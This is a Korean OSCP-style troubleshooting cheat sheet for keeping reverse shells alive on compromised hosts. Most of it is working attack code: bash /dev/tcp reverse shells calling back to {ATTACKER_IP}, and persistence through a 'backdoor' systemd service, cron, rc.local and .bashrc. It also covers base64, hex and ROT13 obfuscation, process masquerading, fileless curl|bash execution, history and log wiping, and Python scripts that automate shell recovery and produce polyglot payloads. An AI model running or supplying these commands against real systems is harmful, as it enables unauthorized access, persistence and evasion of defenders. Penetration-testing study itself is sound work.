# Shell Troubleshooting - OSCP 문제 해결 가이드

> **목표: 쉘 관련 모든 문제를 빠르게 진단하고 해결하여 안정적인 시스템 접근 확보**

## ⚡ 기본 진단 명령어들 (즉시 복사-붙여넣기)

### 🔍 연결 상태 진단

```bash
# 네트워크 연결 확인
ping -c 4 {ATTACKER_IP}
telnet {ATTACKER_IP} 443
nc -zv {ATTACKER_IP} 443

# 포트 리스닝 확인 (공격자 머신)
netstat -ln | grep :443
ss -ln | grep :443
lsof -i :443

# 방화벽 상태 확인
iptables -L
ufw status
firewall-cmd --list-all

# DNS 해석 확인
nslookup {ATTACKER_IP}
dig {ATTACKER_IP}
host {ATTACKER_IP}

# 라우팅 테이블 확인
route -n
ip route show
netstat -rn
```

### 🐚 쉘 상태 진단

```bash
# 현재 쉘 정보
echo $SHELL
echo $0
ps -p $$
tty

# 터미널 기능 확인
test -t 0 && echo "TTY available" || echo "No TTY"
test -t 1 && echo "STDOUT is TTY" || echo "STDOUT not TTY"

# 환경 변수 확인
env | grep -E "(TERM|SHELL|PATH|USER|HOME)"
echo $TERM
echo $PATH

# 프로세스 트리 확인
ps -ef --forest | grep $$
pstree -p $$

# 신호 처리 확인
trap -l
trap

# 작업 제어 확인
jobs
set -o | grep -E "(monitor|notify|vi|emacs)"
```

### 📊 시스템 리소스 확인

```bash
# 메모리 사용량
free -h
cat /proc/meminfo | head -5

# CPU 사용량
top -bn1 | head -10
ps aux --sort=-%cpu | head -10

# 디스크 공간
df -h
du -sh /tmp /var/tmp

# 프로세스 한계
ulimit -a
cat /proc/sys/kernel/pid_max

# 파일 디스크립터
lsof | wc -l
cat /proc/sys/fs/file-max
```

## 🎯 상황별 문제 해결

### ❌ 쉘 연결이 안 될 때

```bash
# 1단계: 리스너 확인
# 공격자 머신에서
ps aux | grep nc
netstat -ln | grep 443
kill $(lsof -t -i:443)  # 기존 프로세스 종료
nc -lvnp 443  # 새 리스너 시작

# 2단계: 다른 포트 시도
for port in 80 443 53 22 21 25 110 143 993 995 8080 8443; do
    echo "[+] Trying port $port"
    nc -lvnp $port &
    sleep 2
    kill %% 2>/dev/null
done

# 3단계: 바인드 쉘로 전환
nc -lvnp 4444 -e /bin/bash &
# 공격자에서
nc {TARGET_IP} 4444

# 4단계: 프로토콜 변경
# UDP 시도
nc -lvnpu 443

# HTTP 터널링
python3 -c "
import http.server
import socketserver
import subprocess

class Handler(http.server.SimpleHTTPRequestHandler):
    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length).decode('utf-8')
        result = subprocess.run(post_data, shell=True, capture_output=True, text=True)
        self.send_response(200)
        self.end_headers()
        self.wfile.write((result.stdout + result.stderr).encode())

with socketserver.TCPServer(('', 8080), Handler) as httpd:
    httpd.serve_forever()
"

# 5단계: 로컬 테스트
ssh localhost
nc 127.0.0.1 443
telnet localhost 443
```

### 🔌 쉘이 바로 끊어질 때

```bash
# 1단계: 백그라운드 실행
nohup bash -c 'bash -i >& /dev/tcp/{ATTACKER_IP}/443 0>&1' &
(bash -c 'bash -i >& /dev/tcp/{ATTACKER_IP}/443 0>&1' &)

# 2단계: 재연결 루프
while true; do
    bash -i >& /dev/tcp/{ATTACKER_IP}/443 0>&1
    sleep 5
done &

# 3단계: 세션 유지
screen -S backdoor -d -m bash -c 'while true; do bash -i >& /dev/tcp/{ATTACKER_IP}/443 0>&1; sleep 5; done'
tmux new-session -d -s backdoor 'while true; do bash -i >& /dev/tcp/{ATTACKER_IP}/443 0>&1; sleep 5; done'

# 4단계: 시스템 서비스 등록
cat > /tmp/backdoor.service << EOF
[Unit]
Description=System Backdoor
After=network.target

[Service]
Type=simple
ExecStart=/bin/bash -c 'while true; do bash -i >& /dev/tcp/{ATTACKER_IP}/443 0>&1; sleep 30; done'
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target
EOF

sudo mv /tmp/backdoor.service /etc/systemd/system/
sudo systemctl enable backdoor.service
sudo systemctl start backdoor.service

# 5단계: Cron 작업
echo "*/5 * * * * /bin/bash -c 'bash -i >& /dev/tcp/{ATTACKER_IP}/443 0>&1'" | crontab -
(crontab -l 2>/dev/null; echo "*/5 * * * * /bin/bash -c 'bash -i >& /dev/tcp/{ATTACKER_IP}/443 0>&1'") | crontab -

# 6단계: Init 스크립트
echo '/bin/bash -c "bash -i >& /dev/tcp/{ATTACKER_IP}/443 0>&1" &' >> /etc/rc.local
echo '/bin/bash -c "bash -i >& /dev/tcp/{ATTACKER_IP}/443 0>&1" &' >> ~/.bashrc
echo '/bin/bash -c "bash -i >& /dev/tcp/{ATTACKER_IP}/443 0>&1" &' >> ~/.profile
```

### 🚫 방화벽/네트워크 제한

```bash
# 1단계: 일반적 포트 사용
# HTTP (80)
python3 -m http.server 80 &
curl -X POST -d "cmd=whoami" http://{ATTACKER_IP}/

# HTTPS (443)
openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 1 -nodes -subj "/CN=test"
openssl s_server -quiet -key key.pem -cert cert.pem -port 443 &

# DNS (53)
nc -lvnpu 53

# 2단계: SSH 터널링
ssh -R 443:localhost:22 user@{ATTACKER_IP}
ssh -L 4444:localhost:4444 user@{TARGET_IP}
ssh -D 9050 user@{TARGET_IP}  # SOCKS 프록시

# 3단계: HTTP 프록시 활용
export http_proxy=http://proxy.company.com:8080
export https_proxy=http://proxy.company.com:8080
curl --proxy http://proxy:8080 http://{ATTACKER_IP}/shell.sh | bash

# 4단계: DNS 터널링
# DNS 요청으로 명령어 전송
dig @{ATTACKER_IP} $(echo "whoami" | base64).tunnel.domain.com

# 5단계: ICMP 터널링
# 공격자 머신
python3 icmp_tunnel_server.py

# 타겟 머신
ping -c 1 -p $(echo "whoami" | xxd -p) {ATTACKER_IP}

# 6단계: IPv6 우회
nc -6 -lvnp 443
bash -i >& /dev/tcp6/[::1]/443 0>&1

# 7단계: 도메인 프론팅
curl -H "Host: legitimate.com" https://cdn.evil.com/shell.sh | bash
```

### 🔒 권한 제한 문제

```bash
# 1단계: 사용자 확인
whoami
id
groups
sudo -l

# 2단계: 실행 가능한 위치 찾기
find / -writable -type d 2>/dev/null | head -10
ls -la /tmp /var/tmp /dev/shm /home/$USER

# 3단계: 대체 실행 경로
# Python이 막혔을 때
/usr/bin/python3 -c 'import pty; pty.spawn("/bin/bash")'
/usr/local/bin/python -c 'import pty; pty.spawn("/bin/bash")'

# 4단계: SUID 바이너리 활용
find / -perm -4000 -type f 2>/dev/null
ls -la /bin/su /usr/bin/sudo /usr/bin/passwd

# 5단계: 환경 변수 조작
export PATH=/tmp:$PATH
cp /bin/bash /tmp/ls
ls  # 실제로는 bash 실행

# 6단계: 라이브러리 경로 조작
export LD_PRELOAD=/tmp/evil.so
echo 'system("/bin/bash");' > /tmp/evil.c
gcc -shared -fPIC /tmp/evil.c -o /tmp/evil.so

# 7단계: 다른 사용자로 실행
su - user -c 'bash -i >& /dev/tcp/{ATTACKER_IP}/443 0>&1'
sudo -u user bash -c 'bash -i >& /dev/tcp/{ATTACKER_IP}/443 0>&1'
```

### 📺 터미널 기능 제한

```bash
# 1단계: TTY 기능 복원
stty sane
reset
clear

# 2단계: 터미널 크기 조정
stty rows 24 columns 80
export LINES=24
export COLUMNS=80

# 3단계: 키 매핑 복원
stty intr ^C
stty susp ^Z
stty quit ^\
stty eof ^D

# 4단계: 제어 문자 처리
stty -ixon  # Ctrl+S/Ctrl+Q 비활성화
stty -ixoff

# 5단계: 색상 지원 활성화
export TERM=xterm-256color
export LS_COLORS='di=1;34:ln=1;36:so=1;35:pi=1;33:ex=1;32'

# 6단계: 자동완성 복원
set +H  # 히스토리 확장 비활성화
bind "set completion-ignore-case on"
bind "TAB:menu-complete"

# 7단계: 히스토리 기능
export HISTFILE=~/.bash_history
export HISTSIZE=1000
set -o history

# 8단계: 프롬프트 개선
export PS1='\[\033[01;32m\]\u@\h\[\033[00m\]:\[\033[01;34m\]\w\[\033[00m\]\$ '
```

## 🔄 우회 기법들

### 🌐 인코딩 우회

```bash
# Base64 우회
echo "YmFzaCAtaSA+JiAvZGV2L3RjcC97QVRUQUNLRVJfSVB9LzQ0MyAwPiYx" | base64 -d | bash

# Hex 우회
echo "626173682d693e262f6465762f7463702f7b41545441434b45525f49507d2f343433303e2631" | xxd -r -p | bash

# URL 인코딩 우회
curl "http://{TARGET_IP}/shell.php?cmd=bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F{ATTACKER_IP}%2F443%200%3E%261"

# HTML 엔티티 우회
echo "&#98;&#97;&#115;&#104;&#32;&#45;&#105;&#32;&#62;&#38;&#32;&#47;&#100;&#101;&#118;&#47;&#116;&#99;&#112;&#47;{ATTACKER_IP}&#47;&#52;&#52;&#51;&#32;&#48;&#62;&#38;&#49;" | sed 's/&#\([0-9]*\);/\\x\1/g' | xargs printf | bash

# ROT13 우회
echo "onfpu -v >& /qri/gpc/{NGGNPXRE_VC}/443 0>&1" | tr 'A-Za-z' 'N-ZA-Mn-za-m' | bash

# 역순 문자열 우회
echo "1&>0 344/{PI_REKCATTA}/pct/ved/& >- i-hsab" | rev | bash

# XOR 인코딩 우회
python3 -c "
key = 0x42
cmd = 'bash -i >& /dev/tcp/{ATTACKER_IP}/443 0>&1'
encoded = ''.join(chr(ord(c) ^ key) for c in cmd)
print(repr(encoded))
"
# 결과를 XOR 디코딩 후 실행
```

### 🔧 프로세스 은닉

```bash
# 1단계: 프로세스명 변경
cp /bin/bash /tmp/systemd-update
exec /tmp/systemd-update

# 2단계: 프로세스 그룹 분리
setsid bash -c 'bash -i >& /dev/tcp/{ATTACKER_IP}/443 0>&1' &

# 3단계: 부모 프로세스 변경
nohup bash -c 'bash -i >& /dev/tcp/{ATTACKER_IP}/443 0>&1' < /dev/null > /dev/null 2>&1 &

# 4단계: 정상 프로세스로 위장
ps aux | grep apache
cp /bin/bash /tmp/apache2
exec /tmp/apache2

# 5단계: 메모리 내 실행
bash -c "$(curl -s http://{ATTACKER_IP}/shell.sh)"
eval "$(curl -s http://{ATTACKER_IP}/shell.sh)"

# 6단계: 파일리스 실행
# 네트워크에서 직접 실행
exec 3<>/dev/tcp/{ATTACKER_IP}/8080
echo -e "GET /shell.sh HTTP/1.1\nHost: {ATTACKER_IP}\n\n" >&3
bash <&3

# 7단계: 환경 변수 활용
export EVIL_CMD="bash -i >& /dev/tcp/{ATTACKER_IP}/443 0>&1"
bash -c '$EVIL_CMD' &
```

### 🎭 탐지 회피

```bash
# 1단계: 시간 지연 공격
sleep $((RANDOM % 300 + 60))  # 1-5분 랜덤 지연
bash -i >& /dev/tcp/{ATTACKER_IP}/443 0>&1

# 2단계: 로그 회피
exec 1>/dev/null 2>/dev/null
history -c
export HISTFILE=/dev/null

# 3단계: 네트워크 패턴 변경
# 주기적 간격이 아닌 랜덤 간격 연결
while true; do
    bash -i >& /dev/tcp/{ATTACKER_IP}/443 0>&1
    sleep $((RANDOM % 1800 + 300))  # 5-30분 랜덤
done &

# 4단계: 정상 트래픽으로 위장
curl -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" \
     http://{ATTACKER_IP}/shell.sh | bash

# 5단계: 암호화 통신
openssl s_client -quiet -connect {ATTACKER_IP}:443 | bash

# 6단계: DNS 기반 통신
# 명령어를 DNS 쿼리로 전송
dig @{ATTACKER_IP} $(echo "whoami" | base64 | tr -d '\n').cmd.domain.com

# 7단계: 스테가노그래피
# 이미지 파일에 숨겨진 명령어 추출
curl http://{ATTACKER_IP}/image.jpg | tail -c +1024 | bash
```

## 🤖 자동화 도구 명령어

### 🔍 자동 쉘 진단 스크립트

```bash
#!/bin/bash
# 쉘 연결 자동 진단 도구

ATTACKER_IP="$1"
TARGET_IP="$2"

if [ $# -ne 2 ]; then
    echo "Usage: $0 <ATTACKER_IP> <TARGET_IP>"
    exit 1
fi

echo "[+] Starting shell connection diagnostics..."

# 1단계: 네트워크 연결성 테스트
echo "[+] Testing network connectivity..."
if ping -c 1 -W 3 "$TARGET_IP" > /dev/null 2>&1; then
    echo "[✓] Target is reachable"
else
    echo "[✗] Target unreachable"
    exit 1
fi

# 2단계: 포트 스캔
echo "[+] Scanning common ports..."
PORTS=(21 22 23 25 53 80 110 143 443 993 995 3389 4444 8080 8443)

for port in "${PORTS[@]}"; do
    if timeout 3 bash -c "echo >/dev/tcp/$TARGET_IP/$port" 2>/dev/null; then
        echo "[✓] Port $port is open"
    fi
done

# 3단계: 역방향 연결 테스트
echo "[+] Testing reverse connection capabilities..."
TEST_PORTS=(443 80 53 8080)

for port in "${TEST_PORTS[@]}"; do
    echo "[+] Testing port $port..."

    # 리스너 시작
    nc -lvnp "$port" &
    LISTENER_PID=$!
    sleep 2

    # 연결 테스트 (실제로는 타겟에서 실행해야 함)
    echo "Test command for target:"
    echo "bash -i >& /dev/tcp/$ATTACKER_IP/$port 0>&1"

    sleep 5
    kill $LISTENER_PID 2>/dev/null
    echo "[+] Test completed for port $port"
done

# 4단계: 대안 연결 방법 제안
echo "[+] Alternative connection methods:"
echo "1. Bind shell: nc -lvnp 4444 -e /bin/bash"
echo "2. HTTP tunnel: python3 -m http.server 8080"
echo "3. SSH tunnel: ssh -R 443:localhost:22 user@$ATTACKER_IP"
echo "4. DNS tunnel: Use dns2tcp or iodine"

echo "[+] Diagnostics completed"
```

### 🔧 자동 쉘 복구 스크립트

```python
#!/usr/bin/env python3
import subprocess
import time
import sys
import threading
import socket

class ShellRecovery:
    def __init__(self, attacker_ip, port):
        self.attacker_ip = attacker_ip
        self.port = port
        self.methods = [
            self.try_reverse_shell,
            self.try_bind_shell,
            self.try_http_tunnel,
            self.try_dns_tunnel,
            self.try_ssh_tunnel
        ]

    def try_reverse_shell(self):
        """기본 리버스 쉘 시도"""
        commands = [
            f"bash -i >& /dev/tcp/{self.attacker_ip}/{self.port} 0>&1",
            f"nc -e /bin/bash {self.attacker_ip} {self.port}",
            f"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{self.attacker_ip}\",{self.port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/bash\",\"-i\"]);'"
        ]

        for cmd in commands:
            print(f"[+] Trying reverse shell: {cmd[:50]}...")
            try:
                subprocess.run(cmd, shell=True, timeout=5)
                return True
            except:
                continue
        return False

    def try_bind_shell(self):
        """바인드 쉘 시도"""
        ports = [4444, 4445, 31337, 8080]

        for port in ports:
            cmd = f"nc -lvnp {port} -e /bin/bash &"
            print(f"[+] Trying bind shell on port {port}...")
            try:
                subprocess.run(cmd, shell=True)
                time.sleep(2)

                # 연결 테스트
                test_cmd = f"nc localhost {port}"
                result = subprocess.run(test_cmd, shell=True, timeout=3, capture_output=True)
                if result.returncode == 0:
                    print(f"[✓] Bind shell active on port {port}")
                    return True
            except:
                continue
        return False

    def try_http_tunnel(self):
        """HTTP 터널 시도"""
        print("[+] Trying HTTP tunnel...")
        server_script = f"""
import http.server
import socketserver
import subprocess

class Handler(http.server.SimpleHTTPRequestHandler):
    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length).decode('utf-8')
        result = subprocess.run(post_data, shell=True, capture_output=True, text=True)
        self.send_response(200)
        self.end_headers()
        self.wfile.write((result.stdout + result.stderr).encode())

with socketserver.TCPServer(('', 8080), Handler) as httpd:
    httpd.serve_forever()
"""

        try:
            with open('/tmp/http_tunnel.py', 'w') as f:
                f.write(server_script)
            subprocess.Popen(['python3', '/tmp/http_tunnel.py'])
            print("[✓] HTTP tunnel started on port 8080")
            return True
        except:
            return False

    def try_dns_tunnel(self):
        """DNS 터널 시도"""
        print("[+] Trying DNS tunnel...")
        # DNS 터널 구현 (간단한 예시)
        try:
            cmd = f"dig @{self.attacker_ip} test.tunnel.domain.com"
            subprocess.run(cmd, shell=True, timeout=5)
            return True
        except:
            return False

    def try_ssh_tunnel(self):
        """SSH 터널 시도"""
        print("[+] Trying SSH tunnel...")
        try:
            cmd = f"ssh -R {self.port}:localhost:22 user@{self.attacker_ip}"
            subprocess.run(cmd, shell=True, timeout=10)
            return True
        except:
            return False

    def recover(self):
        """모든 방법을 시도하여 쉘 복구"""
        print(f"[+] Starting shell recovery to {self.attacker_ip}:{self.port}")

        for i, method in enumerate(self.methods, 1):
            print(f"[+] Attempting method {i}/{len(self.methods)}")
            if method():
                print(f"[✓] Shell recovery successful with method {i}")
                return True
            time.sleep(2)

        print("[✗] All recovery methods failed")
        return False

def main():
    if len(sys.argv) != 3:
        print("Usage: python3 shell_recovery.py <ATTACKER_IP> <PORT>")
        sys.exit(1)

    attacker_ip = sys.argv[1]
    port = int(sys.argv[2])

    recovery = ShellRecovery(attacker_ip, port)
    recovery.recover()

if __name__ == "__main__":
    main()
```

### 📊 쉘 상태 모니터링

```bash
#!/bin/bash
# 쉘 연결 상태 모니터링 도구

ATTACKER_IP="$1"
PORTS=(443 80 53 4444 8080)
LOG_FILE="/tmp/shell_monitor.log"

monitor_connections() {
    while true; do
        timestamp=$(date '+%Y-%m-%d %H:%M:%S')

        for port in "${PORTS[@]}"; do
            # 연결 상태 확인
            if netstat -an | grep -q ":$port.*ESTABLISHED"; then
                echo "[$timestamp] [✓] Active connection on port $port" | tee -a "$LOG_FILE"
            else
                echo "[$timestamp] [✗] No connection on port $port" | tee -a "$LOG_FILE"

                # 자동 복구 시도
                echo "[$timestamp] [+] Attempting recovery on port $port" | tee -a "$LOG_FILE"
                nohup bash -c "bash -i >& /dev/tcp/$ATTACKER_IP/$port 0>&1" &
            fi
        done

        # 5분마다 체크
        sleep 300
    done
}

check_processes() {
    echo "[+] Checking shell-related processes..."
    ps aux | grep -E "(bash|sh|nc|socat)" | grep -v grep

    echo "[+] Checking network connections..."
    netstat -an | grep -E "(443|4444|8080)"

    echo "[+] Checking cron jobs..."
    crontab -l 2>/dev/null | grep -E "(bash|nc|curl)"
}

setup_persistence() {
    echo "[+] Setting up persistent connections..."

    # Cron 작업 추가
    (crontab -l 2>/dev/null; echo "*/10 * * * * bash -i >& /dev/tcp/$ATTACKER_IP/443 0>&1") | crontab -

    # 백그라운드 모니터링 시작
    nohup bash -c monitor_connections > /dev/null 2>&1 &

    echo "[+] Persistence mechanisms activated"
}

case "$1" in
    monitor)
        monitor_connections
        ;;
    check)
        check_processes
        ;;
    persist)
        setup_persistence
        ;;
    *)
        echo "Usage: $0 {monitor|check|persist} [ATTACKER_IP]"
        echo "  monitor  - Start connection monitoring"
        echo "  check    - Check current shell status"
        echo "  persist  - Setup persistence mechanisms"
        ;;
esac
```

### 🔄 자동 우회 시도

```python
#!/usr/bin/env python3
import base64
import subprocess
import time
import random
import string

class BypassAttempts:
    def __init__(self, attacker_ip, port):
        self.attacker_ip = attacker_ip
        self.port = port
        self.base_command = f"bash -i >& /dev/tcp/{attacker_ip}/{port} 0>&1"

    def encode_base64(self, cmd):
        """Base64 인코딩"""
        encoded = base64.b64encode(cmd.encode()).decode()
        return f"echo {encoded} | base64 -d | bash"

    def encode_hex(self, cmd):
        """Hex 인코딩"""
        hex_cmd = cmd.encode().hex()
        return f"echo {hex_cmd} | xxd -r -p | bash"

    def encode_url(self, cmd):
        """URL 인코딩"""
        import urllib.parse
        encoded = urllib.parse.quote(cmd)
        return f"echo '{encoded}' | python3 -c 'import urllib.parse,sys; exec(urllib.parse.unquote(sys.stdin.read()))'"

    def obfuscate_variables(self, cmd):
        """변수를 통한 난독화"""
        parts = cmd.split()
        variables = []
        obfuscated = []

        for i, part in enumerate(parts):
            var_name = f"v{i}"
            variables.append(f"{var_name}='{part}'")
            obfuscated.append(f"${var_name}")

        return "; ".join(variables) + "; " + " ".join(obfuscated)

    def reverse_string(self, cmd):
        """문자열 역순"""
        reversed_cmd = cmd[::-1]
        return f"echo '{reversed_cmd}' | rev | bash"

    def char_codes(self, cmd):
        """ASCII 문자 코드"""
        codes = [str(ord(c)) for c in cmd]
        char_string = ",".join(codes)
        return f"python3 -c \"exec(''.join(chr(i) for i in [{char_string}]))\""

    def environment_vars(self, cmd):
        """환경 변수 활용"""
        env_var = ''.join(random.choices(string.ascii_uppercase, k=8))
        return f"export {env_var}='{cmd}'; bash -c '${env_var}'"

    def try_all_methods(self):
        """모든 우회 방법 시도"""
        methods = [
            ("Base64", self.encode_base64),
            ("Hex", self.encode_hex),
            ("URL", self.encode_url),
            ("Variables", self.obfuscate_variables),
            ("Reverse", self.reverse_string),
            ("ASCII", self.char_codes),
            ("Environment", self.environment_vars)
        ]

        for method_name, method_func in methods:
            print(f"[+] Trying {method_name} encoding...")
            try:
                encoded_cmd = method_func(self.base_command)
                print(f"[+] Encoded command: {encoded_cmd[:100]}...")

                # 실제 실행 (테스트 환경에서만)
                # subprocess.run(encoded_cmd, shell=True, timeout=5)

                time.sleep(2)
            except Exception as e:
                print(f"[✗] {method_name} failed: {e}")

    def generate_polyglot(self):
        """다중 언어 지원 페이로드"""
        polyglot = f"""
# Bash
{self.base_command}

# Python
python3 -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('{self.attacker_ip}',{self.port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['/bin/bash','-i']);"

# Perl
perl -e 'use Socket;$i="{self.attacker_ip}";$p={self.port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");}};'

# Node.js
node -e "require('child_process').spawn('bash', ['-c', 'bash -i >& /dev/tcp/{self.attacker_ip}/{self.port} 0>&1']);"
"""
        return polyglot

def main():
    if len(sys.argv) != 3:
        print("Usage: python3 bypass_attempts.py <ATTACKER_IP> <PORT>")
        sys.exit(1)

    attacker_ip = sys.argv[1]
    port = sys.argv[2]

    bypass = BypassAttempts(attacker_ip, port)

    print("[+] Starting bypass attempts...")
    bypass.try_all_methods()

    print("\n[+] Polyglot payload:")
    print(bypass.generate_polyglot())

if __name__ == "__main__":
    import sys
    main()
```

## 🚨 문제 해결

### 🔌 연결 문제 해결 단계

```bash
# 1단계: 기본 연결성 확인
ping -c 4 {ATTACKER_IP}
traceroute {ATTACKER_IP}
telnet {ATTACKER_IP} 443

# 연결 안될 때
# A. 다른 IP 시도
ping -c 4 8.8.8.8  # 인터넷 연결 확인
nslookup {ATTACKER_DOMAIN}  # DNS 해석 확인

# B. 다른 포트 시도
for port in 80 443 53 22 21 25 110 143 993 995; do
    timeout 3 bash -c "echo >/dev/tcp/{ATTACKER_IP}/$port" && echo "Port $port: Open" || echo "Port $port: Closed"
done

# C. 프로토콜 변경
nc -u {ATTACKER_IP} 53  # UDP
nc -6 {ATTACKER_IP} 443  # IPv6

# 2단계: 방화벽 확인 및 우회
iptables -L
ufw status

# 방화벽 규칙 추가 (권한 있을 때)
iptables -I OUTPUT -p tcp --dport 443 -j ACCEPT
ufw allow out 443

# 방화벽 우회
# A. SSH 터널
ssh -L 443:localhost:443 user@{ATTACKER_IP}
ssh -D 9050 user@{ATTACKER_IP}  # SOCKS 프록시

# B. HTTP 프록시
export http_proxy=http://proxy:8080
curl --proxy http://proxy:8080 http://{ATTACKER_IP}/test

# C. DNS 터널
dig @{ATTACKER_IP} test.domain.com

# 3단계: NAT/라우팅 문제
route -n
ip route show

# 기본 게이트웨이 확인
route add default gw {GATEWAY_IP}

# 4단계: 리스너 문제 (공격자 머신)
# 포트 사용 중인지 확인
netstat -ln | grep :443
lsof -i :443

# 기존 프로세스 종료
kill $(lsof -t -i:443)

# 새 리스너 시작
nc -lvnp 443
socat file:`tty`,raw,echo=0 tcp-listen:443
```

### 🐚 쉘 기능 문제 해결

```bash
# 1단계: TTY 문제 해결
# TTY 없을 때
python -c 'import pty; pty.spawn("/bin/bash")'
script -qc /bin/bash /dev/null
expect -c 'spawn /bin/bash; interact'

# TTY 있지만 기능 제한될 때
stty raw -echo && fg  # Ctrl+Z 후 실행
export TERM=xterm
stty rows 24 columns 80

# 2단계: 신호 처리 문제
# Ctrl+C가 안될 때
stty intr ^C
trap 'echo "Interrupt received"' INT

# Ctrl+Z가 안될 때
stty susp ^Z
set -m  # 작업 제어 활성화

# 3단계: 자동완성 문제
# Tab 완성 안될 때
bind "TAB:complete"
set completion-ignore-case on

# Bash completion 로드
source /etc/bash_completion

# 4단계: 히스토리 문제
# 히스토리 안될 때
set -o history
export HISTFILE=~/.bash_history
export HISTSIZE=1000

# 5단계: 색상 문제
# 색상 안보일 때
export TERM=xterm-256color
export LS_COLORS='di=1;34:ln=1;36:so=1;35:pi=1;33:ex=1;32'
alias ls='ls --color=auto'

# 6단계: 프롬프트 문제
# 프롬프트 깨질 때
export PS1='\u@\h:\w\$ '
export PS1='\[\033[01;32m\]\u@\h\[\033[00m\]:\[\033[01;34m\]\w\[\033[00m\]\$ '
```

### 🔒 권한 및 제한 해결

```bash
# 1단계: 실행 권한 문제
# 실행 안될 때
chmod +x /tmp/shell
ls -la /tmp/shell

# 다른 위치에서 시도
cp shell /var/tmp/
cd /var/tmp && ./shell

# 인터프리터로 실행
bash shell
python shell.py
perl shell.pl

# 2단계: 쓰기 권한 문제
# 쓰기 안될 때
find / -writable -type d 2>/dev/null
ls -la /tmp /var/tmp /dev/shm

# 메모리 파일시스템 활용
mount | grep tmpfs
cd /dev/shm && echo "test" > test.txt

# 3단계: PATH 문제
# 명령어 안찾을 때
echo $PATH
export PATH=/bin:/usr/bin:/sbin:/usr/sbin:$PATH

# 절대 경로 사용
/bin/bash
/usr/bin/python3
/bin/nc

# 4단계: 환경 변수 문제
env | grep -E "(PATH|SHELL|USER|HOME)"

# 필수 환경 변수 설정
export SHELL=/bin/bash
export USER=$(whoami)
export HOME=/home/$USER

# 5단계: ulimit 제한
ulimit -a

# 제한 해제 (권한 있을 때)
ulimit -c unlimited  # 코어 덤프
ulimit -n 4096      # 파일 디스크립터
ulimit -u unlimited  # 프로세스 수
```

### 🌐 네트워크 문제 진단

```bash
# 1단계: 네트워크 인터페이스 확인
ifconfig -a
ip addr show
ip link show

# 인터페이스 활성화
ip link set eth0 up
ifconfig eth0 up

# 2단계: 라우팅 테이블 확인
route -n
ip route show

# 기본 경로 추가
route add default gw {GATEWAY_IP}
ip route add default via {GATEWAY_IP}

# 3단계: DNS 설정 확인
cat /etc/resolv.conf
nslookup google.com
dig google.com

# DNS 서버 변경
echo "nameserver 8.8.8.8" > /etc/resolv.conf

# 4단계: 네트워크 서비스 상태
systemctl status networking
systemctl status NetworkManager

# 서비스 재시작
systemctl restart networking
systemctl restart NetworkManager

# 5단계: 포트 바인딩 문제
netstat -tulnp | grep :443
ss -tulnp | grep :443

# 다른 포트 시도
nc -lvnp 8080 -e /bin/bash
nc -lvnp 31337 -e /bin/bash

# 6단계: 방화벽 로그 확인
tail -f /var/log/ufw.log
tail -f /var/log/iptables.log
dmesg | grep -i "firewall\|netfilter"
```

### 🎯 성능 및 안정성 문제

```bash
# 1단계: 시스템 리소스 확인
free -h
df -h
top -bn1

# 메모리 부족시
echo 3 > /proc/sys/vm/drop_caches  # 캐시 정리
swapoff -a && swapon -a           # 스왑 리셋

# 2단계: 프로세스 제한 확인
ulimit -a
cat /proc/sys/kernel/pid_max

# 좀비 프로세스 정리
ps aux | awk '$8 ~ /^Z/ { print $2 }' | xargs kill -9

# 3단계: 네트워크 버퍼 조정
# 송신 버퍼 크기
echo 16777216 > /proc/sys/net/core/wmem_max
echo 16777216 > /proc/sys/net/core/wmem_default

# 수신 버퍼 크기
echo 16777216 > /proc/sys/net/core/rmem_max
echo 16777216 > /proc/sys/net/core/rmem_default

# 4단계: TCP 설정 최적화
echo 1 > /proc/sys/net/ipv4/tcp_keepalive_time
echo 3 > /proc/sys/net/ipv4/tcp_keepalive_probes
echo 1 > /proc/sys/net/ipv4/tcp_keepalive_intvl

# 5단계: 연결 안정성 개선
# Keep-alive 설정
echo "ServerAliveInterval 60" >> ~/.ssh/config
echo "ServerAliveCountMax 3" >> ~/.ssh/config

# TCP NO_DELAY 설정
echo 1 > /proc/sys/net/ipv4/tcp_nodelay

# 6단계: 로그 관리
# 로그 크기 제한
echo "0" > /var/log/wtmp
echo "0" > /var/log/btmp
> ~/.bash_history

# 로그 비활성화
export HISTFILE=/dev/null
set +o history
```

## 📊 성공 판정 기준

### ✅ 연결 복구 성공

- **네트워크 도달성**: `ping`, `telnet` 명령어로 타겟 접근 가능
- **포트 연결**: 지정된 포트로 TCP/UDP 연결 수립
- **쉘 응답**: `whoami`, `pwd` 등 기본 명령어 정상 실행
- **지속성**: 연결이 끊어지지 않고 안정적 유지

### ✅ 기능 복원 성공

- **TTY 기능**: Tab 완성, 히스토리, 신호 처리 정상 동작
- **터미널 제어**: 색상, 프롬프트, 화면 제어 정상
- **작업 제어**: 백그라운드 작업, 파이프라인 사용 가능
- **파일 시스템**: 읽기/쓰기 권한으로 파일 조작 가능

### ✅ 보안 우회 성공

- **방화벽 우회**: 차단된 포트/프로토콜 우회 접근
- **탐지 회피**: 보안 솔루션의 탐지 없이 실행
- **권한 획득**: 필요한 권한으로 명령어 실행
- **지속성 확보**: 재부팅/재연결 후에도 접근 유지

### ⏰ 시간 관리

- **즉시 진단**: 문제 발생 후 5분 내 원인 파악
- **빠른 해결**: 15분 내 기본적인 문제 해결
- **대안 적용**: 30분 내 우회 방법 적용
- **포기 기준**: 45분 내 해결 안되면 다른 접근 시도

**우선순위**: 연결 복구 > 기능 복원 > 완벽한 설정

## 💡 OSCP 실전 팁

- **문제 로그**: 발생한 문제와 해결 방법을 기록하여 재발 방지
